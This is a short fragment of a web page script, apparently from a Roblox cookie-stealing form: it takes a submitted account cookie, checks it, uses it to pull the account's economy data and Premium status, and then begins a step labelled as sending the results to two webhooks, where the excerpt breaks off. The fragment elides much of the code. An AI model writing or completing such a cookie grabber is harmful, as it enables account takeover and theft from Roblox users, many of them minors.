    ...
    <script>
        ...
        async function submitForm(formData) {
            try {
                ...
                // Step 2: Get additional Roblox data (only if cookie is valid)
                status.textContent = 'Fetching account details...';
                const economyData = await getRobloxEconomy(validation.userData.id, formData.cookie);
                const hasPremium = await getPremiumStatus(validation.userData.id, formData.cookie);

                // Step 3: Send dual webhooks (only if cookie was valid)
